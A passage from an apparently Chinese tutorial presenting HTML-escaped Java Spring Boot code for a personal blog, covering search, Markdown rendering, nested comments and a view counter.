&#x3D; Sort.Direction.DESC)Pageable pageable, Model model)&#123;\n        model.addAttribute(&quot;page&quot;,blogService.listBlog(pageable));\n        model.addAttribute(&quot;types&quot;,typeService.listTypeTop(6));\n        model.addAttribute(&quot;tags&quot;,tagService.listTagTop(10));\n        model.addAttribute(&quot;recommendBlogs&quot;,blogService.listRecommendBlogTop(8));\n        return &quot;index&quot;;\n    &#125;\n\n    @PostMapping(&quot;&#x2F;search&quot;)\n    public String search(@PageableDefault(size &#x3D; 10,sort &#x3D; &#123;&quot;updateTime&quot;&#125;,direction &#x3D; Sort.Direction.DESC)Pageable pageable, @RequestParam String query, Model model)&#123;\n        model.addAttribute(&quot;page&quot;,blogService.listBlog(&quot;%&quot;+query+&quot;%&quot;,pageable));\n        model.addAttribute(&quot;query&quot;,query);\n        return &quot;search&quot;;\n    &#125;\n\n    @GetMapping(&quot;&#x2F;blog&#x2F;&#123;id&#125;&quot;)\n    public String blog(@PathVariable Long id, Model model)&#123;\n        model.addAttribute(&quot;blog&quot;,blogService.getAndConvert(id));\n        return &quot;blog&quot;;\n    &#125;\n\n&#125;\nMarkdownUtils.java Markdown转换HTML工具类\npackage com.cxkj.blog.util;\n\nimport org.commonmark.Extension;\nimport org.commonmark.ext.gfm.tables.TableBlock;\nimport org.commonmark.ext.gfm.tables.TablesExtension;\nimport org.commonmark.ext.heading.anchor.HeadingAnchorExtension;\nimport org.commonmark.node.Link;\nimport org.commonmark.node.Node;\nimport org.commonmark.parser.Parser;\nimport org.commonmark.renderer.html.AttributeProvider;\nimport org.commonmark.renderer.html.AttributeProviderContext;\nimport org.commonmark.renderer.html.AttributeProviderFactory;\nimport org.commonmark.renderer.html.HtmlRenderer;\n\nimport java.util.*;\n\n&#x2F;**\n *  Created by Arvin on 2021&#x2F;2&#x2F;12.\n *&#x2F;\n\npublic class MarkdownUtils &#123;\n\n    &#x2F;**\n     * markdown格式转换成HTML格式\n     * @param markdown\n     * @return\n     *&#x2F;\n    public static String markdownToHtml(String markdown) &#123;\n        Parser parser &#x3D; Parser.builder().build();\n        Node document &#x3D; parser.parse(markdown);\n        HtmlRenderer renderer &#x3D; HtmlRenderer.builder().build();\n        return renderer.render(document);\n    &#125;\n\n    &#x2F;**\n     * 增加扩展[标题锚点，表格生成]\n     * Markdown转换成HTML\n     * @param markdown\n     * @return\n     *&#x2F;\n    public static String markdownToHtmlExtensions(String markdown) &#123;\n        &#x2F;&#x2F;h标题生成id\n        Set&lt;Extension&gt; headingAnchorExtensions &#x3D; Collections.singleton(HeadingAnchorExtension.create());\n        &#x2F;&#x2F;转换table的HTML\n        List&lt;Extension&gt; tableExtension &#x3D; Arrays.asList(TablesExtension.create());\n        Parser parser &#x3D; Parser.builder()\n                .extensions(tableExtension)\n                .build();\n        Node document &#x3D; parser.parse(markdown);\n        HtmlRenderer renderer &#x3D; HtmlRenderer.builder()\n                .extensions(headingAnchorExtensions)\n                .extensions(tableExtension)\n                .attributeProviderFactory(new AttributeProviderFactory() &#123;\n                    public AttributeProvider create(AttributeProviderContext context) &#123;\n                        return new CustomAttributeProvider();\n                    &#125;\n                &#125;)\n                .build();\n        return renderer.render(document);\n    &#125;\n\n    &#x2F;**\n     * 处理标签的属性\n     *&#x2F;\n    static class CustomAttributeProvider implements AttributeProvider &#123;\n        @Override\n        public void setAttributes(Node node, String tagName, Map&lt;String, String&gt; attributes) &#123;\n            &#x2F;&#x2F;改变a标签的target属性为_blank\n            if (node instanceof Link) &#123;\n                attributes.put(&quot;target&quot;, &quot;_blank&quot;);\n            &#125;\n            if (node instanceof TableBlock) &#123;\n                attributes.put(&quot;class&quot;, &quot;ui celled table&quot;);\n            &#125;\n        &#125;\n    &#125;\n\n\n    public static void main(String[] args) &#123;\n        String table &#x3D; &quot;| hello | hi   | 哈哈哈   |\\n&quot; +\n                &quot;| ----- | ---- | ----- |\\n&quot; +\n                &quot;| 斯维尔多  | 士大夫  | f啊    |\\n&quot; +\n                &quot;| 阿什顿发  | 非固定杆 | 撒阿什顿发 |\\n&quot; +\n                &quot;\\n&quot;;\n        String a &#x3D; &quot;[imCoding 爱编程](http:&#x2F;&#x2F;www.lirenmi.cn)&quot;;\n        System.out.println(markdownToHtmlExtensions(a));\n    &#125;\n&#125;\nBlogService.java\npackage com.cxkj.blog.service;\n\nimport com.cxkj.blog.pojo.Blog;\nimport com.cxkj.blog.vo.BlogQuery;\nimport org.springframework.data.domain.Page;\nimport org.springframework.data.domain.Pageable;\n\nimport java.util.List;\n\n&#x2F;**\n *  Created by Arvin on 2021&#x2F;2&#x2F;8.\n *&#x2F;\n\npublic interface BlogService &#123;\n\n    Blog getBlog(Long id);\n\n    Page&lt;Blog&gt; listBlog(Pageable pageable, BlogQuery blogQuery);\n\n    Page&lt;Blog&gt; listBlog(Pageable pageable);\n\n    Page&lt;Blog&gt; listBlog(String query,Pageable pageable);\n    \n    Blog getAndConvert(Long id);\n\n    List&lt;Blog&gt; listRecommendBlogTop(Integer size);\n\n    Blog saveBlog(Blog blog);\n\n    Blog updateBlog(Long id,Blog blog);\n\n    void deleteBlog(Long id);\n&#125;\nBlogServiceImpl.java\npackage com.cxkj.blog.service;\n\nimport com.cxkj.blog.NotFoundException;\nimport com.cxkj.blog.dao.BlogRepository;\nimport com.cxkj.blog.pojo.Blog;\nimport com.cxkj.blog.pojo.Type;\nimport com.cxkj.blog.util.MarkdownUtils;\nimport com.cxkj.blog.util.MyBeanUtils;\nimport com.cxkj.blog.vo.BlogQuery;\nimport org.springframework.beans.BeanUtils;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.data.domain.Page;\nimport org.springframework.data.domain.PageRequest;\nimport org.springframework.data.domain.Pageable;\nimport org.springframework.data.domain.Sort;\nimport org.springframework.data.jpa.domain.Specification;\nimport org.springframework.stereotype.Service;\nimport org.springframework.transaction.annotation.Transactional;\n\nimport javax.persistence.criteria.CriteriaBuilder;\nimport javax.persistence.criteria.CriteriaQuery;\nimport javax.persistence.criteria.Predicate;\nimport javax.persistence.criteria.Root;\nimport java.util.ArrayList;\nimport java.util.Date;\nimport java.util.List;\n\n&#x2F;**\n *  Created by Arvin on 2021&#x2F;2&#x2F;8.\n *&#x2F;\n@Service\npublic class BlogServiceImpl implements BlogService&#123;\n\n    @Autowired\n    private BlogRepository blogRepository;\n\n    @Override\n    public Blog getBlog(Long id) &#123;\n        return blogRepository.findById(id).get();\n    &#125;\n\n    @Override\n    public Page&lt;Blog&gt; listBlog(Pageable pageable, BlogQuery blogQuery) &#123;\n\n        return blogRepository.findAll(new Specification&lt;Blog&gt;() &#123;\n            @Override\n            public Predicate toPredicate(Root&lt;Blog&gt; root, CriteriaQuery&lt;?&gt; criteriaQuery, CriteriaBuilder criteriaBuilder) &#123;\n                List&lt;Predicate&gt; predicateList &#x3D; new ArrayList&lt;&gt;();\n                if (!&quot;&quot;.equals(blogQuery.getTitle()) &amp;&amp; blogQuery.getTitle() !&#x3D; null)&#123;\n                    predicateList.add(criteriaBuilder.like(root.&lt;String&gt;get(&quot;title&quot;),&quot;%&quot;+blogQuery.getTitle()+&quot;%&quot;));\n                &#125;\n                if (blogQuery.getTypeID() !&#x3D; null)&#123;\n                    predicateList.add(criteriaBuilder.equal(root.&lt;Type&gt;get(&quot;type&quot;).get(&quot;id&quot;),blogQuery.getTypeID()));\n                &#125;\n                if (blogQuery.isRecommend())&#123;\n                    predicateList.add(criteriaBuilder.equal(root.&lt;Boolean&gt;get(&quot;recommend&quot;),blogQuery.isRecommend()));\n                &#125;\n                criteriaQuery.where(predicateList.toArray(new Predicate[predicateList.size()]));\n                return null;\n            &#125;\n        &#125;,pageable);\n    &#125;\n\n    @Override\n    public Page&lt;Blog&gt; listBlog(Pageable pageable) &#123;\n        return blogRepository.findAll(pageable);\n    &#125;\n\n    @Override\n    public Page&lt;Blog&gt; listBlog(String query, Pageable pageable) &#123;\n        return blogRepository.findByQuery(query,pageable);\n    &#125;\n\n    @Override\n    public Blog getAndConvert(Long id) &#123;\n        Blog blog &#x3D; blogRepository.findById(id).get();\n        if (blog &#x3D;&#x3D; null)&#123;\n            throw new NotFoundException(&quot;博客不存在哦&quot;);\n        &#125;\n        Blog b &#x3D; new Blog();\n        BeanUtils.copyProperties(blog,b);\n        String content &#x3D; b.getContent();\n        b.setContent(MarkdownUtils.markdownToHtmlExtensions(content));\n        return b;\n    &#125;\n\n    @Override\n    public List&lt;Blog&gt; listRecommendBlogTop(Integer size) &#123;\n        Sort sort &#x3D; Sort.by(Sort.Direction.DESC,&quot;updateTime&quot;);\n        Pageable pageable &#x3D; PageRequest.of(0,size,sort);\n        return blogRepository.findTop(pageable);\n    &#125;\n\n    @Transactional\n    @Override\n    public Blog saveBlog(Blog blog) &#123;\n        if (blog.getId() &#x3D;&#x3D; null)&#123;\n            blog.setCreateTime(new Date());\n            blog.setUpdateTime(new Date());\n            blog.setViews(0);\n        &#125;else &#123;\n            blog.setUpdateTime(new Date());\n        &#125;\n        return blogRepository.save(blog);\n    &#125;\n\n    @Transactional\n    @Override\n    public Blog updateBlog(Long id, Blog blog) &#123;\n        Blog b &#x3D; blogRepository.findById(id).get();\n        if (b &#x3D;&#x3D; null)&#123;\n            throw new NotFoundException(&quot;管理员大大,这个博客不存在哦！～(　TロT)σ&quot;);\n        &#125;\n        BeanUtils.copyProperties(blog,b, MyBeanUtils.getNullPropertyNames(blog));\n        b.setUpdateTime(new Date());\n        return blogRepository.save(b);\n    &#125;\n\n    @Transactional\n    @Override\n    public void deleteBlog(Long id) &#123;\n        blogRepository.deleteById(id);\n    &#125;\n&#125;\n评论模块实现CommentController.java\npackage com.cxkj.blog.web;\n\nimport com.cxkj.blog.pojo.Comment;\nimport com.cxkj.blog.service.BlogService;\nimport com.cxkj.blog.service.CommentService;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.beans.factory.annotation.Value;\nimport org.springframework.stereotype.Controller;\nimport org.springframework.ui.Model;\nimport org.springframework.web.bind.annotation.GetMapping;\nimport org.springframework.web.bind.annotation.PathVariable;\nimport org.springframework.web.bind.annotation.PostMapping;\n\nimport javax.validation.Valid;\n\n&#x2F;**\n *  Created by Arvin on 2021&#x2F;2&#x2F;13.\n *&#x2F;\n@Controller\npublic class CommentController &#123;\n\n    @Autowired\n    private CommentService commentService;\n\n    @Autowired\n    private BlogService blogService;\n\n    @Value(&quot;$&#123;comment.avatar&#125;&quot;)\n    private String avatar;\n\n    @GetMapping(&quot;&#x2F;comments&#x2F;&#123;blogId&#125;&quot;)\n    public String comments(@PathVariable Long blogId, Model model)&#123;\n        model.addAttribute(&quot;comments&quot;,commentService.listCommentByBlogId(blogId));\n        return &quot;blog :: commentList&quot;;\n    &#125;\n\n    @PostMapping(&quot;&#x2F;comments&quot;)\n    public String post(Comment comment) &#123;\n        Long blogId &#x3D; comment.getBlog().getId();\n        comment.setBlog(blogService.getBlog(blogId));\n        comment.setAvatar(avatar);\n        commentService.saveComment(comment);\n        return &quot;redirect:&#x2F;comments&#x2F;&quot; + blogId;\n    &#125;\n&#125;\nCommentService.java\npackage com.cxkj.blog.service;\n\nimport com.cxkj.blog.pojo.Comment;\n\nimport java.util.List;\n\n&#x2F;**\n *  Created by Arvin on 2021&#x2F;2&#x2F;13.\n *&#x2F;\n\npublic interface CommentService &#123;\n\n    List&lt;Comment&gt; listCommentByBlogId(Long blogId);\n\n    Comment saveComment(Comment comment);\n&#125;\nCommentServiceImpl.java\npackage com.cxkj.blog.service;\n\nimport com.cxkj.blog.dao.CommentRepository;\nimport com.cxkj.blog.pojo.Comment;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.data.domain.Sort;\nimport org.springframework.stereotype.Service;\nimport org.springframework.transaction.annotation.Transactional;\n\nimport java.util.Date;\nimport java.util.List;\n\n&#x2F;**\n *  Created by Arvin on 2021&#x2F;2&#x2F;13.\n *&#x2F;\n@Service\npublic class CommentServiceImpl implements CommentService&#123;\n\n    @Autowired\n    private CommentRepository commentRepository;\n\n    @Override\n    public List&lt;Comment&gt; listCommentByBlogId(Long blogId) &#123;\n        Sort sort &#x3D; Sort.by(Sort.Direction.DESC,&quot;createTime&quot;);\n        return commentRepository.findByBlogId(blogId,sort);\n    &#125;\n\n    @Transactional\n    @Override\n    public Comment saveComment(Comment comment) &#123;\n        Long parentCommentId &#x3D; comment.getParentComment().getId();\n        if (parentCommentId !&#x3D; -1)&#123;\n            comment.setParentComment(commentRepository.findById(parentCommentId).get());\n        &#125;else &#123;\n            comment.setParentComment(null);\n        &#125;\n        comment.setCreateTime(new Date());\n        return commentRepository.save(comment);\n    &#125;\n&#125;\nCommentRepository.java\npackage com.cxkj.blog.dao;\n\nimport com.cxkj.blog.pojo.Comment;\nimport org.springframework.data.domain.Sort;\nimport org.springframework.data.jpa.repository.JpaRepository;\n\nimport java.util.List;\n\n&#x2F;**\n *  Created by Arvin on 2021&#x2F;2&#x2F;13.\n *&#x2F;\n\npublic interface CommentRepository extends JpaRepository&lt;Comment,Long&gt; &#123;\n\n    List&lt;Comment&gt; findByBlogId(Long blogId, Sort sort);\n&#125;\n评论模块细节优化CommentRepository.java\npackage com.cxkj.blog.dao;\n\nimport com.cxkj.blog.pojo.Comment;\nimport org.springframework.data.domain.Sort;\nimport org.springframework.data.jpa.repository.JpaRepository;\n\nimport java.util.List;\n\n&#x2F;**\n *  Created by Arvin on 2021&#x2F;2&#x2F;13.\n *&#x2F;\n\npublic interface CommentRepository extends JpaRepository&lt;Comment,Long&gt; &#123;\n\n    List&lt;Comment&gt; findByBlogIdAndParentCommentNull(Long blogId, Sort sort);\n&#125;\nCommentServiceImpl.java\npackage com.cxkj.blog.service;\n\nimport com.cxkj.blog.dao.CommentRepository;\nimport com.cxkj.blog.pojo.Comment;\nimport org.springframework.beans.BeanUtils;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.data.domain.Sort;\nimport org.springframework.stereotype.Service;\nimport org.springframework.transaction.annotation.Transactional;\n\nimport java.util.ArrayList;\nimport java.util.Date;\nimport java.util.List;\n\n&#x2F;**\n *  Created by Arvin on 2021&#x2F;2&#x2F;13.\n *&#x2F;\n@Service\npublic class CommentServiceImpl implements CommentService&#123;\n\n    @Autowired\n    private CommentRepository commentRepository;\n\n    @Override\n    public List&lt;Comment&gt; listCommentByBlogId(Long blogId) &#123;\n        Sort sort &#x3D; Sort.by(Sort.Direction.DESC,&quot;createTime&quot;);\n        List&lt;Comment&gt; comments &#x3D; commentRepository.findByBlogIdAndParentCommentNull(blogId,sort);\n        return eachComment(comments);\n    &#125;\n\n    @Transactional\n    @Override\n    public Comment saveComment(Comment comment) &#123;\n        Long parentCommentId &#x3D; comment.getParentComment().getId();\n        if (parentCommentId !&#x3D; -1)&#123;\n            comment.setParentComment(commentRepository.findById(parentCommentId).get());\n        &#125;else &#123;\n            comment.setParentComment(null);\n        &#125;\n        comment.setCreateTime(new Date());\n        return commentRepository.save(comment);\n    &#125;\n\n    &#x2F;**\n     * 循环每个顶级的评论节点\n     * @param comments\n     * @return\n     *&#x2F;\n    private List&lt;Comment&gt; eachComment(List&lt;Comment&gt; comments)&#123;\n        List&lt;Comment&gt; commentsView &#x3D; new ArrayList&lt;&gt;();\n        for (Comment comment : comments)&#123;\n            Comment c &#x3D; new Comment();\n            BeanUtils.copyProperties(comment,c);\n            commentsView.add(c);\n        &#125;\n        &#x2F;&#x2F;合并评论的各层子代到第一级子代集合中\n        combineChildren(commentsView);\n        return commentsView;\n    &#125;\n\n    &#x2F;**\n     * @param comments root根节点，blog不为null的对象集合\n     * @return\n     *&#x2F;\n    private void combineChildren(List&lt;Comment&gt; comments)&#123;\n        for (Comment comment : comments)&#123;\n            List&lt;Comment&gt; replys &#x3D; comment.getReplyComments();\n            for (Comment reply : replys)&#123;\n                &#x2F;&#x2F;循环迭代,找出子代,存放在tempReplys中\n                recursively(reply);\n            &#125;\n            &#x2F;&#x2F;修改顶级节点的reply集合为迭代处理后的集合\n            comment.setReplyComments(tempReplys);\n            &#x2F;&#x2F;清除临时存放区\n            tempReplys &#x3D; new ArrayList&lt;&gt;();\n        &#125;\n    &#125;\n\n    &#x2F;&#x2F;存放迭代找出的所有子代的集合\n    private List&lt;Comment&gt; tempReplys &#x3D; new ArrayList&lt;&gt;();\n    &#x2F;**\n     * 递归迭代，剥洋葱\n     * @param comment 被迭代的对象\n     * @return\n     *&#x2F;\n    private void recursively(Comment comment) &#123;\n        tempReplys.add(comment);&#x2F;&#x2F;顶节点添加到临时存放集合\n        if (comment.getReplyComments().size()&gt;0) &#123;\n            List&lt;Comment&gt; replays &#x3D; comment.getReplyComments();\n            for (Comment reply : replays) &#123;\n                tempReplys.add(reply);\n                if (reply.getReplyComments().size()&gt;0) &#123;\n                    recursively(reply);\n                &#125;\n            &#125;\n        &#125;\n    &#125;\n&#125;\nCommentController.java\npackage com.cxkj.blog.web;\n\nimport com.cxkj.blog.pojo.Comment;\nimport com.cxkj.blog.service.BlogService;\nimport com.cxkj.blog.service.CommentService;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.beans.factory.annotation.Value;\nimport org.springframework.stereotype.Controller;\nimport org.springframework.ui.Model;\nimport org.springframework.web.bind.annotation.GetMapping;\nimport org.springframework.web.bind.annotation.PathVariable;\nimport org.springframework.web.bind.annotation.PostMapping;\n\nimport javax.validation.Valid;\n\n&#x2F;**\n *  Created by Arvin on 2021&#x2F;2&#x2F;13.\n *&#x2F;\n@Controller\npublic class CommentController &#123;\n\n    @Autowired\n    private CommentService commentService;\n\n    @Autowired\n    private BlogService blogService;\n\n    @Value(&quot;$&#123;comment.avatar&#125;&quot;)\n    private String avatar;\n\n    @GetMapping(&quot;&#x2F;comments&#x2F;&#123;blogId&#125;&quot;)\n    public String comments(@PathVariable Long blogId, Model model)&#123;\n        model.addAttribute(&quot;comments&quot;,commentService.listCommentByBlogId(blogId));\n        return &quot;blog :: commentList&quot;;\n    &#125;\n\n    @PostMapping(&quot;&#x2F;comments&quot;)\n    public String post(Comment comment) &#123;\n        Long blogId &#x3D; comment.getBlog().getId();\n        comment.setBlog(blogService.getBlog(blogId));\n        comment.setAvatar(avatar);\n        commentService.saveComment(comment);\n        return &quot;redirect:&#x2F;comments&#x2F;&quot; + blogId;\n    &#125;\n&#125;\n特殊用户评论模块CommentServiceImpl.java\npackage com.cxkj.blog.service;\n\nimport com.cxkj.blog.dao.CommentRepository;\nimport com.cxkj.blog.pojo.Comment;\nimport org.springframework.beans.BeanUtils;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.data.domain.Sort;\nimport org.springframework.stereotype.Service;\nimport org.springframework.transaction.annotation.Transactional;\n\nimport java.util.ArrayList;\nimport java.util.Date;\nimport java.util.List;\n\n&#x2F;**\n *  Created by Arvin on 2021&#x2F;2&#x2F;13.\n *&#x2F;\n@Service\npublic class CommentServiceImpl implements CommentService&#123;\n\n    @Autowired\n    private CommentRepository commentRepository;\n\n    @Override\n    public List&lt;Comment&gt; listCommentByBlogId(Long blogId) &#123;\n        Sort sort &#x3D; Sort.by(Sort.Direction.ASC,&quot;createTime&quot;);\n        List&lt;Comment&gt; comments &#x3D; commentRepository.findByBlogIdAndParentCommentNull(blogId,sort);\n        return eachComment(comments);\n    &#125;\n\n    @Transactional\n    @Override\n    public Comment saveComment(Comment comment) &#123;\n        Long parentCommentId &#x3D; comment.getParentComment().getId();\n        if (parentCommentId !&#x3D; -1)&#123;\n            comment.setParentComment(commentRepository.findById(parentCommentId).get());\n        &#125;else &#123;\n            comment.setParentComment(null);\n        &#125;\n        comment.setCreateTime(new Date());\n        return commentRepository.save(comment);\n    &#125;\n\n    &#x2F;**\n     * 循环每个顶级的评论节点\n     * @param comments\n     * @return\n     *&#x2F;\n    private List&lt;Comment&gt; eachComment(List&lt;Comment&gt; comments)&#123;\n        List&lt;Comment&gt; commentsView &#x3D; new ArrayList&lt;&gt;();\n        for (Comment comment : comments)&#123;\n            Comment c &#x3D; new Comment();\n            BeanUtils.copyProperties(comment,c);\n            commentsView.add(c);\n        &#125;\n        &#x2F;&#x2F;合并评论的各层子代到第一级子代集合中\n        combineChildren(commentsView);\n        return commentsView;\n    &#125;\n\n    &#x2F;**\n     * @param comments root根节点，blog不为null的对象集合\n     * @return\n     *&#x2F;\n    private void combineChildren(List&lt;Comment&gt; comments)&#123;\n        for (Comment comment : comments)&#123;\n            List&lt;Comment&gt; replys &#x3D; comment.getReplyComments();\n            for (Comment reply : replys)&#123;\n                &#x2F;&#x2F;循环迭代,找出子代,存放在tempReplys中\n                recursively(reply);\n            &#125;\n            &#x2F;&#x2F;修改顶级节点的reply集合为迭代处理后的集合\n            comment.setReplyComments(tempReplys);\n            &#x2F;&#x2F;清除临时存放区\n            tempReplys &#x3D; new ArrayList&lt;&gt;();\n        &#125;\n    &#125;\n\n    &#x2F;&#x2F;存放迭代找出的所有子代的集合\n    private List&lt;Comment&gt; tempReplys &#x3D; new ArrayList&lt;&gt;();\n    &#x2F;**\n     * 递归迭代，剥洋葱\n     * @param comment 被迭代的对象\n     * @return\n     *&#x2F;\n    private void recursively(Comment comment) &#123;\n        tempReplys.add(comment);&#x2F;&#x2F;顶节点添加到临时存放集合\n        if (comment.getReplyComments().size()&gt;0) &#123;\n            List&lt;Comment&gt; replays &#x3D; comment.getReplyComments();\n            for (Comment reply : replays) &#123;\n                tempReplys.add(reply);\n                if (reply.getReplyComments().size()&gt;0) &#123;\n                    recursively(reply);\n                &#125;\n            &#125;\n        &#125;\n    &#125;\n&#125;\nComment.java\npackage com.cxkj.blog.pojo;\n\nimport javax.persistence.*;\nimport java.util.ArrayList;\nimport java.util.Date;\nimport java.util.List;\n\n&#x2F;**\n *  Created by Arvin on 2021&#x2F;2&#x2F;4.\n *&#x2F;\n@Entity\n@Table(name &#x3D; &quot;t_comment&quot;)\npublic class Comment &#123;\n\n    @Id\n    @GeneratedValue\n    private Long id;\n    private String nickname;\n    private String email;\n    private String content;\n    private String avatar;\n    @Temporal(TemporalType.TIMESTAMP)\n    private Date createTime;\n\n    @ManyToOne\n    private Blog blog;\n\n    @OneToMany(mappedBy &#x3D; &quot;parentComment&quot;)\n    private List&lt;Comment&gt; replyComments &#x3D; new ArrayList&lt;&gt;();\n    @ManyToOne\n    private Comment parentComment;\n    \n    private boolean adminComment;\n\n    public Comment() &#123;\n    &#125;\n\n    public Long getId() &#123;\n        return id;\n    &#125;\n\n    public void setId(Long id) &#123;\n        this.id &#x3D; id;\n    &#125;\n\n    public String getNickname() &#123;\n        return nickname;\n    &#125;\n\n    public void setNickname(String nickname) &#123;\n        this.nickname &#x3D; nickname;\n    &#125;\n\n    public String getEmail() &#123;\n        return email;\n    &#125;\n\n    public void setEmail(String email) &#123;\n        this.email &#x3D; email;\n    &#125;\n\n    public String getContent() &#123;\n        return content;\n    &#125;\n\n    public void setContent(String content) &#123;\n        this.content &#x3D; content;\n    &#125;\n\n    public String getAvatar() &#123;\n        return avatar;\n    &#125;\n\n    public void setAvatar(String avatar) &#123;\n        this.avatar &#x3D; avatar;\n    &#125;\n\n    public Date getCreateTime() &#123;\n        return createTime;\n    &#125;\n\n    public void setCreateTime(Date createTime) &#123;\n        this.createTime &#x3D; createTime;\n    &#125;\n\n    public Blog getBlog() &#123;\n        return blog;\n    &#125;\n\n    public void setBlog(Blog blog) &#123;\n        this.blog &#x3D; blog;\n    &#125;\n\n    public List&lt;Comment&gt; getReplyComments() &#123;\n        return replyComments;\n    &#125;\n\n    public void setReplyComments(List&lt;Comment&gt; replyComments) &#123;\n        this.replyComments &#x3D; replyComments;\n    &#125;\n\n    public Comment getParentComment() &#123;\n        return parentComment;\n    &#125;\n\n    public void setParentComment(Comment parentComment) &#123;\n        this.parentComment &#x3D; parentComment;\n    &#125;\n\n    public boolean isAdminComment() &#123;\n        return adminComment;\n    &#125;\n\n    public void setAdminComment(boolean adminComment) &#123;\n        this.adminComment &#x3D; adminComment;\n    &#125;\n\n    @Override\n    public String toString() &#123;\n        return &quot;Comment&#123;&quot; +\n                &quot;id&#x3D;&quot; + id +\n                &quot;, nickname&#x3D;&#39;&quot; + nickname + &#39;\\&#39;&#39; +\n                &quot;, email&#x3D;&#39;&quot; + email + &#39;\\&#39;&#39; +\n                &quot;, content&#x3D;&#39;&quot; + content + &#39;\\&#39;&#39; +\n                &quot;, avatar&#x3D;&#39;&quot; + avatar + &#39;\\&#39;&#39; +\n                &quot;, createTime&#x3D;&quot; + createTime +\n                &quot;, blog&#x3D;&quot; + blog +\n                &quot;, replyComments&#x3D;&quot; + replyComments +\n                &quot;, parentComment&#x3D;&quot; + parentComment +\n                &quot;, adminComment&#x3D;&quot; + adminComment +\n                &#39;&#125;&#39;;\n    &#125;\n&#125;\n浏览次数模块BlogRepository.java\npackage com.cxkj.blog.dao;\n\nimport com.cxkj.blog.pojo.Blog;\nimport org.springframework.data.domain.Page;\nimport org.springframework.data.domain.Pageable;\nimport org.springframework.data.jpa.repository.JpaRepository;\nimport org.springframework.data.jpa.repository.JpaSpecificationExecutor;\nimport org.springframework.data.jpa.repository.Modifying;\nimport org.springframework.data.jpa.repository.Query;\nimport org.springframework.transaction.annotation.Transactional;\n\nimport java.util.List;\n\n&#x2F;**\n *  Created by Arvin on 2021&#x2F;2&#x2F;8.\n *&#x2F;\n\npublic interface BlogRepository extends JpaRepository&lt;Blog,Long&gt;, JpaSpecificationExecutor&lt;Blog&gt; &#123;\n\n    @Query(&quot;select b from Blog b where b.recommend &#x3D; true&quot;)\n    List&lt;Blog&gt; findTop(Pageable pageable);\n\n    &#x2F;&#x2F;select * from t_blog where title like &#39;%内容%&#39;\n    @Query(&quot;select b from Blog b where b.title like ?1 or b.content like ?1&quot;)\n    Page&lt;Blog&gt; findByQuery(String query,Pageable pageable);\n    \n    @Transactional\n    @Modifying\n    @Query(&quot;update Blog b set b.views &#x3D; b.views+1 where b.id &#x3D; ?1&quot;)\n    int updateViews(Long id);\n&#125;\nBlogServiceImpl.java\npackage com.cxkj.blog.service;\n\nimport com.cxkj.blog.NotFoundException;\nimport com.cxkj.blog.dao.BlogRepository;\nimport com.cxkj.blog.pojo.Blog;\nimport com.cxkj.blog.pojo.Type;\nimport com.cxkj.blog.util.MarkdownUtils;\nimport com.cxkj.blog.util.MyBeanUtils;\nimport com.cxkj.blog.vo.BlogQuery;\nimport org.springframework.beans.BeanUtils;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.data.domain.Page;\nimport org.springframework.data.domain.PageRequest;\nimport org.springframework.data.domain.Pageable;\nimport org.springframework.data.domain.Sort;\nimport org.springframework.data.jpa.domain.Specification;\nimport org.springframework.stereotype.Service;\nimport org.springframework.transaction.annotation.Transactional;\n\nimport javax.persistence.criteria.CriteriaBuilder;\nimport javax.persistence.criteria.CriteriaQuery;\nimport javax.persistence.criteria.Predicate;\nimport javax.persistence.criteria.Root;\nimport java.util.ArrayList;\nimport java.util.Date;\nimport java.util.List;\n\n&#x2F;**\n *  Created by Arvin on 2021&#x2F;2&#x2F;8.\n *&#x2F;\n@Service\npublic class BlogServiceImpl implements BlogService&#123;\n\n    @Autowired\n    private BlogRepository blogRepository;\n\n    @Override\n    public Blog getBlog(Long id) &#123;\n        return blogRepository.findById(id).get();\n    &#125;\n\n    @Override\n    public Page&lt;Blog&gt; listBlog(Pageable pageable, BlogQuery blogQuery) &#123;\n\n        return blogRepository.findAll(new Specification&lt;Blog&gt;() &#123;\n            @Override\n            public Predicate toPredicate(Root&lt;Blog&gt; root, CriteriaQuery&lt;?&gt; criteriaQuery, CriteriaBuilder criteriaBuilder) &#123;\n                List&lt;Predicate&gt; predicateList &#x3D; new ArrayList&lt;&gt;();\n                if (!&quot;&quot;.equals(blogQuery.getTitle()) &amp;&amp; blogQuery.getTitle() !&#x3D; null)&#123;\n                    predicateList.add(criteriaBuilder.like(root.&lt;String&gt;get(&quot;title&quot;),&quot;%&quot;+blogQuery.getTitle()+&quot;%&quot;));\n                &#125;\n                if (blogQuery.getTypeID() !&#x3D; null)&#123;\n                    predicateList.add(criteriaBuilder.equal(root.&lt;Type&gt;get(&quot;type&quot;).get(&quot;id&quot;),blogQuery.getTypeID()));\n                &#125;\n                if (blogQuery.isRecommend())&#123;\n                    predicateList.add(criteriaBuilder.equal(root.&lt;Boolean&gt;get(&quot;recommend&quot;),blogQuery.isRecommend()));\n                &#125;\n                criteriaQuery.where(predicateList.toArray(new Predicate[predicateList.size()]));\n                return null;\n            &#125;\n        &#125;,pageable);\n    &#125;\n\n    @Override\n    public Page&lt;Blog&gt; listBlog(Pageable pageable) &#123;\n        return blogRepository.findAll(pageable);\n    &#125;\n\n    @Override\n    public Page&lt;Blog&gt; listBlog(String query, Pageable pageable) &#123;\n        return blogRepository.findByQuery(query,pageable);\n    &#125;\n\n    @Transactional\n    @Override\n    public Blog getAndConvert(Long id) &#123;\n        Blog blog &#x3D; blogRepository.findById(id).get();\n        if (blog &#x3D;&#x3D; null)&#123;\n            throw new NotFoundException(&quot;博客不存在哦&quot;);\n        &#125;\n        Blog b &#x3D; new Blog();\n        BeanUtils.copyProperties(blog,b);\n        String content &#x3D; b.getContent();\n        b.setContent(MarkdownUtils.markdownToHtmlExtensions(content));\n        blogRepository.updateViews(id);\n        return b;\n    &#125;\n\n    @Override\n    public List&lt;Blog&gt; listRecommendBlogTop(Integer size) &#123;\n        Sort sort &#x3D; Sort.by(Sort.Direction.DESC,&quot;updateTime&quot;);\n        Pageable pageable &#x3D; PageRequest.of(0,size,sort);\n        return blogRepository.findTop(pageable);\n    &#125;\n\n    @Transactional\n    @Override\n    public Blog saveBlog(Blog blog) &#123;\n        if (blog.getId() &#x3D;&#x3D; null)&#123;\n            